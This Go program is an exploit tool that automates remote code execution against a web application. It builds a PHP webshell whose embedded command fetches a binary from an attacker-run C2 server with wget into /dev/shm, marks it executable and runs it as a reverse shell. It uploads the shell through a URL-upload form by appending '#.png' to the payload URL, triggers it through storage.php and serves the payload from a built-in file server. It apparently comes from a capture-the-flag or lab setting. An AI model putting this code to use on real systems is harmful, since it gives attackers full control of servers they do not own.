package main

import (
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

var SRV http.Server

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type Client struct {
	baseURL      string
	Route        string
	Session      *http.Client
	Shellfile    string
	Webshellname string
}

//
// Function Name: BuildWebshell
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to build a PHP webshell that will
//  be uploaded to the target.
//
// Input(s):
//
//  c2addr - string. address of c2 server (http://<addr>)
//
// Return(s):
//
//  err - error. error or nil.
//
func (c *Client) BuildWebshell(c2addr string) (err error) {
	var fptr *os.File
	var webshellcontent string

	SysMsgNB("building webshell ...")

	webshellcontent = "<?php\n"
	webshellcontent = fmt.Sprintf("%s$c2=\"%s\";\n", webshellcontent, c2addr)
	webshellcontent = fmt.Sprintf("%s$cmd=\"wget -O /dev/shm/.rev \".$c2.\";", webshellcontent)
	webshellcontent = fmt.Sprintf("%schmod +x /dev/shm/.rev;", webshellcontent)
	webshellcontent = fmt.Sprintf("%snohup /dev/shm/.rev\";\n", webshellcontent)
	webshellcontent = fmt.Sprintf("%ssystem($cmd);\n", webshellcontent)
	webshellcontent = fmt.Sprintf("%s?>", webshellcontent)

	fptr, err = os.OpenFile(c.Webshellname, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer fptr.Close()

	_, err = fptr.WriteString(webshellcontent)
	if err != nil {
		return nil
	}

	return nil
}

// ============================================================
//
// Function Name: GetBodyContent
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take make a GET request to a target
//  route and return the body content to the user.
//
// Input(s):
//
//  route - string. route to make GET request on.
//
// Return(s):
//
//  bodycontent - []byte. content pulled from target URL.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) GetBodyContent(route string) (bodycontent []byte, err error) {
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, route)

	resp, err := c.Session.Get(targetURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return bodycontent, nil
}

// ============================================================
//
// Function Name: Testconnection
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to test the connection to a target.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) TestConnection() (success bool, message string) {
	SysMsgNB(fmt.Sprintf("testing connection to \"%s\"", c.baseURL))

	resp, err := c.Session.Get(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	return true, "client connection successful"
}

//
// Function Name: TriggerShell
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to trigger the uploaded PHP webshell.
//
// Input(s):
//
//  None
//
// Return(s):
//
//  err - error. error or nil.
//
func (c *Client) TriggerShell() (err error) {
	var req *http.Request
	var resp *http.Response
	var sessidcookie string
	var targetroute string = "storage.php"
	var targeturl string = fmt.Sprintf("%s/%s", c.baseURL, targetroute)

	SysMsgNB("waiting for upload ...")
	time.Sleep(3 * time.Second)

	req, err = http.NewRequest(http.MethodGet, targeturl, nil)
	if err != nil {
		return err
	}
	sessidcookie = c.Session.Jar.Cookies(req.URL)[0].String()
	req.Header.Set("Cookie", sessidcookie)

	resp, err = c.Session.Do(req)
	if err != nil {
		if os.IsTimeout(err) {
			return nil
		}
		return err
	}
	defer resp.Body.Close()

	targeturl = fmt.Sprintf("%s/cloud/images/%s", c.baseURL, c.Webshellname)

	SysMsgNB(fmt.Sprintf("contacting %s ...", c.Webshellname))
	req, err = http.NewRequest(http.MethodGet, targeturl, nil)
	if err != nil {
		return err
	}
	req.Header.Set("Cookie", sessidcookie)

	resp, err = c.Session.Do(req)
	if err != nil {
		if os.IsTimeout(err) {
			return nil
		}
		return err
	}
	defer resp.Body.Close()

	return nil
}

//
// Function Name: UploadWebshell
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to upload a PHP webshell to the
//  target, that will reach out to a C2 server and pull
//  down, execute, and open a reverse shell.
//
// Input(s):
//
//  c2addr - string. address of c2 server (http://<addr>)
//
// Return(s):
//
//  err - error. error or nil.
//
func (c *Client) UploadWebshell(c2addr string) (err error) {
	var payload string
	var postdata url.Values = url.Values{}
	var req *http.Request
	var resp *http.Response
	var targetroute string = "cloud"
	var targeturl string = fmt.Sprintf("%s/%s/", c.baseURL, targetroute)

	err = c.BuildWebshell(fmt.Sprintf("%s/%s", c2addr, c.Shellfile))
	if err != nil {
		return err
	}

	payload = fmt.Sprintf("%s/%s#.png", c2addr, c.Webshellname)
	postdata.Set("url", payload)

	req, err = http.NewRequest(http.MethodPost, targeturl, strings.NewReader(postdata.Encode()))
	if err != nil {
		return err
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	resp, err = c.Session.Do(req)
	if err != nil {
		if os.IsTimeout(err) {
			return nil
		}
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return errors.New(fmt.Sprintf("bad status code (%s)", resp.Status))
	}

	c.Session.Jar.SetCookies(req.URL, resp.Cookies())

	return nil
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (success bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be between 1 and 65535"
	}
	return true, "port valid"
}

//============================================================
//
// Function Name: PrintCenter
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to print a message in the center of a
//  specified number of columns (n).
//
// Input(s):
//
//  msg - string. message to display.
//  n - int. total number of columns in row.
//
// Return(s):
//
//  None
//
//============================================================
func PrintCenter(msg string, n int) {
	var ansi_indent string = "\x1b%s"
	var indent_format string = "[%dC"
	var indent int

	fmt.Printf("%s", ANSI_CLRLN)
	if len(msg) > n {
		fmt.Printf("%s\n", msg)
		return
	}

	indent = (n - len(msg)) / 2
	indent_format = fmt.Sprintf(indent_format, indent)
	ansi_indent = fmt.Sprintf(ansi_indent, indent_format)

	fmt.Printf("%s%s%s%s\n", ansi_indent, ANSI_YLW, msg, ANSI_RST)

	return
}

func PrintChar(char byte, n int) {
	if n < 1 {
		return
	}

	for i := 0; i < n; i++ {
		fmt.Printf("%s%s%s", ANSI_RED, string(char), ANSI_RST)
	}
	fmt.Printf("\n")
}

//============================================================
//
// Function Name: FindMatch
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take a byte slice, search the slice
//  for a given regular expression pattern, and return the
//  first match of that pattern.
//
// Input(s):
//
//  bodycontent - []byte. byte slice to search for pattern.
//  tgtpattern - string. regex pattern to search for.
//
// Return(s):
//
//  match - string. first match of pattern discovered.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func FindMatch(bodycontent []byte, tgtpattern string) (match string, success bool, message string) {

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return "", false, err.Error()
	}

	matches := re.FindAll(bodycontent, -1)

	if len(matches) < 1 {
		return "", false, "no match found"
	}

	match = string(matches[0])

	return match, true, "match found"
}

// ============================================================
//
// Function Name: GenRandomName
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to generate a random string 8 characters
//  long, containing only alpha-numeric characters.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func GenRandomName(minlen int, maxlen int) (name string, err error) {
	const charset string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var length int

	// validate min/max parameters
	if (minlen <= 0) || (maxlen <= 0) {
		return "", errors.New("min and max lengths mus be greater than zero")
	} else if minlen > maxlen {
		return "", errors.New("min length must be less than or equal to max length")
	}

	rand.Seed(time.Now().UnixMilli())

	length = rand.Intn(minlen + (maxlen - minlen))

	name = ""

	for i := 0; i < length; i++ {
		name = fmt.Sprintf("%s%s", name, string(charset[rand.Intn(len(charset))]))
	}

	return name, nil
}

//
// Function Name: GrabIPs
//
// Author: Thomas Osgood
//
// Description:
//
//    Function designed to acquire all IPv4 network addresses
//    attached to the current machine. If the targetIface
//    argument is set to "", all network interfaces will be
//    searched. If a specific network interface is speficied,
//    only that interface's IP address(es) will be returned.
//    If the specified network interface does not exist, an
//    error will be returned.
//
// Input(s):
//
//    targetIface - string. interface to get IP for.
//
// Return(s):
//
//    ipList - []net.IP. list of IP addresses acquired.
//    err - error. error or nil.
//
func GrabIPs(targetIface string) (ipList []net.IP, err error) {
	var address net.Addr
	var addresses []net.Addr
	var foundiface bool = false
	var iface net.Interface
	var interfaces []net.Interface
	var ip net.IP

	//------------------------------------------------------------
	// grab all network interfaces
	//------------------------------------------------------------
	interfaces, err = net.Interfaces()
	if err != nil {
		return nil, err
	}

	for _, iface = range interfaces {

		//------------------------------------------------------------
		// ignore loopback addresses (127.0.0.1)
		//------------------------------------------------------------
		if strings.Contains(iface.Flags.String(), net.FlagLoopback.String()) {
			continue
		}

		//------------------------------------------------------------
		// if target interface is set, only display target
		//------------------------------------------------------------
		if (len(targetIface) > 0) && (iface.Name != targetIface) {
			continue
		}

		foundiface = true

		//------------------------------------------------------------
		// grab all addresses from current interface
		//------------------------------------------------------------
		addresses, err = iface.Addrs()
		if err != nil {
			return nil, err
		}

		//------------------------------------------------------------
		// loop through all addresses present in current interface
		//------------------------------------------------------------
		for _, address = range addresses {
			switch v := address.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			//------------------------------------------------------------
			// only grab IPv4 addresses
			//------------------------------------------------------------
			if ip.To4() == nil {
				continue
			}

			ipList = append(ipList, ip)
		}
	}

	//------------------------------------------------------------
	// error finding target (or any) network interface
	//------------------------------------------------------------
	if (len(targetIface) > 0) && !foundiface {
		return nil, errors.New(fmt.Sprintf("unable to find interface \"%s\"", targetIface))
	} else if !foundiface {
		return nil, errors.New("no network interfaces discovered")
	}

	return ipList, nil
}

//
// Function Name: StartListener
//
// Author: Thomas Osgood
//
// Description:
//
//    Function designed to create an HTTP server to use during
//    this attack. It can deliver files to the target and decode
//    data coming from the target.
//
// Input(s):
//
//    ip - string. ip address to listen on.
//    port - int. port to listen on.
//    wg - *sync.WaitGroup. waitgroup this is a part of.
//
// Return(s):
//
//    err - error. error or nil.
//
func StartListener(ip string, port int, wg *sync.WaitGroup) (err error) {
	if wg != nil {
		defer wg.Done()
	}

	SRV = http.Server{Addr: fmt.Sprintf("%s:%d", ip, port)}

	var currentDir string
	var fs http.Handler

	currentDir, err = os.Getwd()

	fs = http.FileServer(http.Dir(currentDir))

	http.Handle("/", http.StripPrefix("/", fs))

	SucMsg(fmt.Sprintf("fileserver being hosted at %s:%d", ip, port))
	if err = SRV.ListenAndServe(); err != http.ErrServerClosed {
		ErrMsg(err.Error())
		return err
	}
	SucMsg("server successfully shutdown")

	return nil
}

func init() {
	return
}

func main() {
	var domain string
	var port int

	var baseURL string
	var scheme string

	var secure bool
	var iface bool

	var ips []net.IP
	var err error

	var c2ip string
	var c2p int

	var proxyaddr string

	var transport http.Transport = http.Transport{}
	var client Client = Client{
		Session:      &http.Client{Timeout: 10 * time.Second, Transport: &transport},
		Webshellname: "rev.php",
	}

	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
	flag.IntVar(&port, "p", 80, "port to communicate with target on")
	flag.BoolVar(&secure, "s", false, "use HTTPS instead of HTTP")
	flag.BoolVar(&secure, "secure", false, "use HTTPS instead of HTTP")
	flag.StringVar(&c2ip, "c2ip", "", "ip, domain, or interface of C2 server")
	flag.IntVar(&c2p, "c2port", 9999, "port to contact c2 server on")
	flag.BoolVar(&iface, "interface", false, "c2ip specified is network interface")
	flag.StringVar(&proxyaddr, "proxy", "", "proxy to use when making requests (http://...)")
	flag.StringVar(&client.Shellfile, "shell", "rev", "reverse shell to upload to target")
	flag.Parse()

	success, message := ValidatePort(port)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}

	if len(c2ip) > 0 {
		//============================================================
		// if "c2" specified is a network interface, take the
		// IP address of the interface and assign it to the
		// c2 variable to be used
		//============================================================
		if iface {
			ips, err = GrabIPs(c2ip)
			if err != nil {
				ErrMsg(err.Error())
				os.Exit(1)
			}
			c2ip = ips[0].String()
		}

		success, message = ValidatePort(c2p)
		if !success {
			ErrMsg(message)
			os.Exit(1)
		}

	}

	if len(proxyaddr) > 0 {
		var proxyurl *url.URL = &url.URL{}
		var proxysplit []string = strings.Split(proxyaddr, "://")
		var hostsplit []string
		var hostroute string

		if len(proxysplit) < 2 {
			ErrMsg("proxy must be in form \"http://<address>\" or \"https://<address>\"")
			os.Exit(1)
		}

		proxyurl.Scheme = proxysplit[0]

		hostsplit = strings.Split(proxysplit[1], "/")
		proxyurl.Host = hostsplit[0]

		if len(hostsplit) > 1 {
			hostroute = strings.Join(hostsplit[1:], "/")
			proxyurl.Path = hostroute
		}

		transport.Proxy = http.ProxyURL(proxyurl)
	}

	PrintChar('=', 60)
	PrintCenter("Target Information", 60)
	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	InfMsg(fmt.Sprintf("Target Port: %d", port))
	InfMsg(fmt.Sprintf("HTTPS: %v", secure))

	if len(c2ip) > 0 {
		InfMsg(fmt.Sprintf("C2IP: %s", c2ip))
		InfMsg(fmt.Sprintf("C2Port: %d", c2p))
	}

	if len(proxyaddr) > 0 {
		InfMsg(fmt.Sprintf("Proxy: %s", proxyaddr))
	}

	PrintChar('=', 60)

	//============================================================
	// HTTPS check.
	//============================================================
	if secure {
		scheme = "https"
	} else {
		scheme = "http"
	}
	baseURL = fmt.Sprintf("%s://%s:%d", scheme, domain, port)

	client.baseURL = baseURL

	client.Session.Jar, err = cookiejar.New(nil)
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}

	// C2 address specified. start fileserver.
	if len(c2ip) > 0 {
		go StartListener(c2ip, c2p, nil)
		time.Sleep(250 * time.Millisecond)
		defer SRV.Close()
	}

	//============================================================
	// Make sure the target is reachable.
	//============================================================
	success, message = client.TestConnection()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	err = client.UploadWebshell(fmt.Sprintf("http://%s:%d", c2ip, c2p))
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}
	SucMsg("webshell successfully uploaded")

	err = client.TriggerShell()
	if err != nil {
		ErrMsg(err.Error())
		os.Exit(1)
	}
	SucMsg("webshell successfully triggered")

	return
}

